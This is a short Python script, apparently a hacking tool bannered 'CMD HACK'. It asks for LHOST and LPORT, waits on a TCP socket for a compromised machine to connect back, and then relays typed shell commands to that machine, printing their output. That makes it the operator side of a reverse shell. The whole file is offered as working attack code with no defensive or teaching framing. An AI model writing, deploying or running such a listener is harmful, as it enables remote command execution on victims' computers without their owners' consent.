import socket
import os

os.system('cls')

blue = '\x1b[34m'
green = '\x1b[32m'
red = '\x1b[41m'
cyan = '\x1b[36m'
red2 = '\x1b[31m'
stop = '\x1b[0m'

print(f"""{red2}      ::::::::         :::   :::       :::::::::               :::    :::           :::        ::::::::       :::    ::: 
    :+:    :+:       :+:+: :+:+:      :+:    :+:              :+:    :+:         :+: :+:     :+:    :+:      :+:   :+:   
   +:+             +:+ +:+:+ +:+     +:+    +:+              +:+    +:+        +:+   +:+    +:+             +:+  +:+     
  +#+             +#+  +:+  +#+     +#+    +:+              +#++:++#++       +#++:++#++:   +#+             +#++:++       
 +#+             +#+       +#+     +#+    +#+              +#+    +#+       +#+     +#+   +#+             +#+  +#+       
#+#    #+#      #+#       #+#     #+#    #+#              #+#    #+#       #+#     #+#   #+#    #+#      #+#   #+#       
########       ###       ###     #########               ###    ###       ###     ###    ########       ###    ###       
 
 {stop}""")

ip = input(f'{blue}LHOST :{stop} ')
print('\n')
port = input(f'{blue}LPORT [default port: 7878] :{stop} ')
print('\n')

try:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, int(port)))
    print(f'{cyan}connecting...{stop}')
    server.listen(2)
    client, addr = server.accept()
    print(f'{cyan}connected to {addr}{stop}')

except Exception as e:
    print(f'{red}{e}{stop}')

else:
    cmdlet = input('$ ')    
    try:        
        while cmdlet != 'quit':
            client.send(cmdlet.encode('utf-8'))
            result = client.recv(8192).decode('utf-8')
            print(f'{green}{result}{stop}')
            cmdlet = input('$ ')
        server.close
        print(f'{red}Disconnected from {ip} @ {port}{stop}')

    except Exception as e1:
        print(f'{red}{e1}{stop}')
